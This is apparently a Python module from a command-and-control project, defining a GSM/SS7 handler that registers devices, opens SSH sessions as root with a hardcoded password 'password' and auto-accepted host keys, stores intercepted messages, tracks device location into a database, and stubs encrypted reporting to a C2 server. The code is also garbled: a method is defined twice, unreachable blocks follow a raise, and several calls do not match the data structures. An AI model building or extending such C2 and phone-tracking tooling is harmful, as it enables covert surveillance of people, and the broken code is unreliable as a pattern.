import os
import logging
import asyncio
import json
from datetime import datetime
import pymongo
from cryptography.fernet import Fernet
from src.protocols.gsm_protocols import GsmProtocols
from paramiko import SSHClient, AutoAddPolicy
from typing import Optional, Dict, Any, List, Tuple
from concurrent.futures import ThreadPoolExecutor
import socket
import ssl
import ipaddress
import phonenumbers
from dataclasses import dataclass
from enum import Enum

# Use existing logger from c2_server
logger = logging.getLogger('C2Server')

class ProtocolStatus(Enum):
    INITIALIZING = "initializing"
    CONNECTED = "connected"
    FAILED = "failed"
    DISCONNECTED = "disconnected"

class ConnectionType(Enum):
    GSM = "gsm"
    SS7 = "ss7"
    IP = "ip"
    PHONE = "phone"

@dataclass
class ConnectionInfo:
    device_id: str
    connection_type: ConnectionType
    ip_address: Optional[str] = None
    phone_number: Optional[str] = None
    status: ProtocolStatus = ProtocolStatus.DISCONNECTED
    last_seen: datetime = datetime.utcnow()
    protocols: List[str] = None
    error: Optional[str] = None

class GsmSs7Handler:
    def __init__(self, db_client, encryption_key, max_connections=100):
        self.db = db_client
        self.fernet = Fernet(encryption_key)
        self.gsm_connections: Dict[str, ConnectionInfo] = {}
        self.ss7_connections: Dict[str, ConnectionInfo] = {}
        self.active_sessions: Dict[str, Any] = {}
        self.protocol_handler = GsmProtocols(db_client, encryption_key)
        self.executor = ThreadPoolExecutor(max_workers=max_connections)
        self.max_retries = 5
        self.retry_delay = 5  # seconds
        self.connection_timeout = 60  # seconds
        self.session_timeout = 300  # seconds
        self.monitoring_interval = 10  # seconds
        self.supported_protocols: Dict[str, Dict[str, Any]] = {
            'GSM': {
                'protocols': ['RR', 'LAPDm', 'MAC', 'MM', 'CC', 'SMS', 'SS', 'MAP', 'BSSAP', 'DTAP'],
                'encryption': ['A3A8', 'A5'],
                'authentication': ['SIM', 'RP'],
                'transport': ['TP', 'SNDCP', 'LLC', 'BSSGP']
            },
            'SS7': {
                'protocols': ['MTP', 'SCCP', 'TCAP', 'MAP', 'ISUP', 'CAP', 'INAP', 'GSM-MAP'],
                'security': ['SIGTRAN', 'SCTP', 'TLS'],
                'monitoring': ['SIGTRAN-MON', 'SS7-MON']
            },
            'IP': {
                'protocols': ['TCP', 'UDP', 'ICMP', 'DNS'],
                'tunneling': ['SSH', 'SSL', 'TLS'],
                'proxy': ['SOCKS', 'HTTP', 'DNS']
            }
        }
        
    async def initialize_gsm(self, device_id: str, ip_address: Optional[str] = None, phone_number: Optional[str] = None):
        """Initialize GSM connection for a device with error handling and retries"""
        try:
            # Validate input parameters
            if not device_id:
                raise ValueError("device_id is required")
            
            # Validate IP address if provided
            if ip_address:
                try:
                    ipaddress.ip_address(ip_address)
                except ValueError:
                    raise ValueError(f"Invalid IP address: {ip_address}")
            
            # Validate phone number if provided
            if phone_number:
                try:
                    parsed = phonenumbers.parse(phone_number)
                    if not phonenumbers.is_valid_number(parsed):
                        raise ValueError(f"Invalid phone number: {phone_number}")
                except phonenumbers.NumberParseException:
                    raise ValueError(f"Invalid phone number format: {phone_number}")
            
            # Initialize all GSM protocols with retry mechanism
            protocols = self.supported_protocols['GSM']['protocols'] + \
                       self.supported_protocols['GSM']['encryption'] + \
                       self.supported_protocols['GSM']['authentication'] + \
                       self.supported_protocols['GSM']['transport']
            
            connection_info = ConnectionInfo(
                device_id=device_id,
                connection_type=ConnectionType.GSM,
                ip_address=ip_address,
                phone_number=phone_number,
                protocols=protocols
            )
            
            # Store connection info
            self.gsm_connections[device_id] = connection_info
            
            for protocol in protocols:
                success = False
                attempts = 0
                while not success and attempts < self.max_retries:
                    try:
                        result = await asyncio.wait_for(
                            self.protocol_handler.initialize_protocol(
                                device_id, protocol, ip_address, phone_number
                            ),
                            timeout=self.connection_timeout
                        )
                        success = True
                        connection_info.status = ProtocolStatus.CONNECTED
                    except asyncio.TimeoutError:
                        attempts += 1
                        if attempts < self.max_retries:
                            logger.warning(f"Connection timeout for {protocol} on {device_id}, retrying...")
                            await asyncio.sleep(self.retry_delay)
                        else:
                            logger.error(f"Connection timeout after {self.max_retries} attempts for {protocol}")
                            connection_info.status = ProtocolStatus.FAILED
                            connection_info.error = "Connection timeout"
                            raise
                    except (socket.error, ssl.SSLError) as e:
                        attempts += 1
                        if attempts < self.max_retries:
                            logger.warning(f"Connection attempt {attempts} failed for {protocol} on {device_id}: {str(e)}")
                            await asyncio.sleep(self.retry_delay)
                        else:
                            logger.error(f"Failed to initialize {protocol} after {self.max_retries} attempts: {str(e)}")
                            connection_info.status = ProtocolStatus.FAILED
                            connection_info.error = str(e)
                            raise
                    except Exception as e:
                        logger.error(f"Unexpected error initializing {protocol}: {str(e)}")
                        connection_info.status = ProtocolStatus.FAILED
                        connection_info.error = str(e)
                        raise
            
            logger.info(f"Successfully initialized GSM connection for device {device_id}")
            return True
        except Exception as e:
            logger.error(f"Failed to initialize GSM for device {device_id}: {str(e)}")
            if device_id in self.gsm_connections:
                self.gsm_connections[device_id].status = ProtocolStatus.FAILED
                self.gsm_connections[device_id].error = str(e)
            raise
            
            # Store connection info
            self.gsm_connections[device_id] = {
                'ip_address': ip_address,
                'phone_number': phone_number,
                'last_seen': datetime.utcnow(),
                'status': 'connected'
            }
            
            return True
        except Exception as e:
            logger.error(f"Failed to initialize GSM for device {device_id}: {str(e)}")
            raise

    async def close_connection(self, device_id: str):
        """Cleanly close a device's GSM connection"""
        try:
            if device_id in self.gsm_connections:
                # Close all protocol connections
                for protocol in self.gsm_connections[device_id].get('protocols', []):
                    try:
                        await self.protocol_handler.close_protocol(device_id, protocol)
                    except Exception as e:
                        logger.warning(f"Error closing {protocol} for {device_id}: {str(e)}")
                
                # Clean up connection data
                del self.gsm_connections[device_id]
                
                # Update device status
                await self.db.update_device_status(device_id, 'offline')
                
                logger.info(f"Successfully closed GSM connection for device {device_id}")
                return True
            return False
        except Exception as e:
            logger.error(f"Error closing GSM connection for {device_id}: {str(e)}")
            raise

    def _cleanup_stale_connections(self):
        """Cleanup stale connections that haven't been seen in a while"""
        current_time = datetime.utcnow()
        stale_threshold = 300  # 5 minutes
        
        for device_id, conn_info in list(self.gsm_connections.items()):
            if (current_time - conn_info['last_seen']).total_seconds() > stale_threshold:
                try:
                    logger.info(f"Cleaning up stale connection for device {device_id}")
                    asyncio.create_task(self.close_connection(device_id))
                except Exception as e:
                    logger.error(f"Error cleaning up stale connection {device_id}: {str(e)}")

    async def start_connection_cleanup(self):
        """Start periodic cleanup of stale connections"""
        while True:
            try:
                self._cleanup_stale_connections()
                await asyncio.sleep(300)  # Check every 5 minutes
            except Exception as e:
                logger.error(f"Error in connection cleanup: {str(e)}")
                await asyncio.sleep(60)  # Wait a minute before retrying

    async def __aenter__(self):
        """Context manager support for proper resource cleanup"""
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Clean up all connections when exiting context"""
        try:
            # Close all active connections
            for device_id in list(self.gsm_connections.keys()):
                await self.close_connection(device_id)
            
            # Shutdown thread pool
            self.executor.shutdown(wait=True)
            
            logger.info("Successfully cleaned up all GSM connections")
            return True
        except Exception as e:
            logger.error(f"Error during cleanup: {str(e)}")
            return False

    async def initialize_gsm(self, device_id: str, ip_address: Optional[str] = None, phone_number: Optional[str] = None):
        """Initialize GSM connection for a device with error handling and retries"""
        try:
            # Validate input parameters
            if not device_id:
                raise ValueError("device_id is required")
            
            # Create session data
            session_data = {
                'device_id': device_id,
                'ip_address': ip_address,
                'phone_number': phone_number,
                'status': 'initializing',
                'timestamp': datetime.utcnow()
            }
            
            self.active_sessions[device_id] = session_data
            return {'status': 'success', 'message': 'GSM connection initialized'}
            
        except Exception as e:
            logger.error(f"Error initializing GSM: {str(e)}")
            return {'status': 'error', 'message': str(e)}

    def initialize_ss7(self, device_id, ip_address=None, phone_number=None):
        """Initialize SS7 connection for a device"""
        try:
            # Initialize SS7 connection
            ss7_conn = SSHClient()
            ss7_conn.set_missing_host_key_policy(AutoAddPolicy())
            ss7_conn.connect(ip_address, username='root', password='password')
            
            # Store connection
            self.ss7_connections[device_id] = {
                'connection': ss7_conn,
                'ip_address': ip_address,
                'phone_number': phone_number,
                'status': 'active',
                'timestamp': datetime.utcnow()
            }
            
            return {'status': 'success', 'message': 'SS7 connection initialized'}
            
        except Exception as e:
            logger.error(f"Error initializing SS7: {str(e)}")
            return {'status': 'error', 'message': str(e)}

    def handle_gsm_message(self, device_id, message):
        """Handle incoming GSM message"""
        try:
            # Decrypt message if encrypted
            if isinstance(message, bytes):
                message = self.fernet.decrypt(message)
            
            # Process message using appropriate protocol
            protocol = self.protocol_handler.get_protocol(message)
            if protocol:
                result = protocol.process_message(message)
                if result['status'] == 'success':
                    # Store processed message in database
                    self.db.gsm_messages.insert_one({
                        'device_id': device_id,
                        'protocol': protocol.name,
                        'message': result['data'],
                        'timestamp': datetime.utcnow()
                    })
                    
                    return {'status': 'success', 'message': 'Message processed'}
                
            return {'status': 'error', 'message': 'Unknown protocol'}
            
        except Exception as e:
            logger.error(f"Error processing GSM message: {str(e)}")
            return {'status': 'error', 'message': str(e)}

    def handle_ss7_message(self, device_id, message):
        """Handle incoming SS7 message"""
        try:
            # Decrypt message if encrypted
            if isinstance(message, bytes):
                message = self.fernet.decrypt(message)
            
            # Process message using appropriate protocol
            protocol = self.protocol_handler.get_protocol(message)
            if protocol:
                result = protocol.process_message(message)
                if result['status'] == 'success':
                    # Store processed message in database
                    self.db.ss7_messages.insert_one({
                        'device_id': device_id,
                        'protocol': protocol.name,
                        'message': result['data'],
                        'timestamp': datetime.utcnow()
                    })
                    
                    return {'status': 'success', 'message': 'Message processed'}
                
            return {'status': 'error', 'message': 'Unknown protocol'}
            
        except Exception as e:
            logger.error(f"Error processing SS7 message: {str(e)}")
            return {'status': 'error', 'message': str(e)}

    def terminate_gsm(self, device_id):
        """Terminate GSM connection"""
        try:
            if device_id in self.active_sessions:
                session = self.active_sessions[device_id]
                # Clean up resources
                for protocol in session['protocols']:
                    self.protocol_handler.terminate_protocol(device_id, protocol)
                
                del self.active_sessions[device_id]
                return {'status': 'success', 'message': 'GSM connection terminated'}
                
        except Exception as e:
            logger.error(f"Error terminating GSM: {str(e)}")
            return {'status': 'error', 'message': str(e)}

    def terminate_ss7(self, device_id):
        """Terminate SS7 connection"""
        try:
            if device_id in self.ss7_connections:
                conn = self.ss7_connections[device_id]['connection']
                conn.disconnect()
                del self.ss7_connections[device_id]
                return {'status': 'success', 'message': 'SS7 connection terminated'}
                
        except Exception as e:
            logger.error(f"Error terminating SS7: {str(e)}")
            return {'status': 'error', 'message': str(e)}
            
    async def track_location(self, device_id):
        """Track device location using GSM/SS7"""
        try:
            # Get GSM connection
            gsm_conn = self.gsm_connections.get(device_id)
            if not gsm_conn:
                return {'status': 'error', 'message': 'GSM connection not found'}
                
            # Get location
            location = gsm_conn.get_location()
            
            # Store location
            location_data = {
                'device_id': device_id,
                'latitude': location['latitude'],
                'longitude': location['longitude'],
                'accuracy': location['accuracy'],
                'timestamp': datetime.now().isoformat()
            }
            self.db['location_history'].insert_one(location_data)
            
            return {'status': 'success', 'data': location_data}
            
        except Exception as e:
            logging.error(f"Failed to track location: {str(e)}")
            return {'status': 'error', 'message': str(e)}
            
    def notify_c2(self, event_type, data):
        """Notify C2 server about GSM/SS7 events"""
        try:
            # Encrypt data
            encrypted_data = self.fernet.encrypt(json.dumps(data).encode())
            
            # Send to C2 server
            # This would be implemented based on your C2 server's notification system
            # For example, using WebSocket or HTTP
            pass
            
        except Exception as e:
            logging.error(f"Failed to notify C2: {str(e)}")

# Initialize GSM/SS7 handler
gsm_ss7_handler = None

def initialize_gsm_ss7(db_client, encryption_key):
    global gsm_ss7_handler
    gsm_ss7_handler = GsmSs7Handler(db_client, encryption_key)
    return gsm_ss7_handler
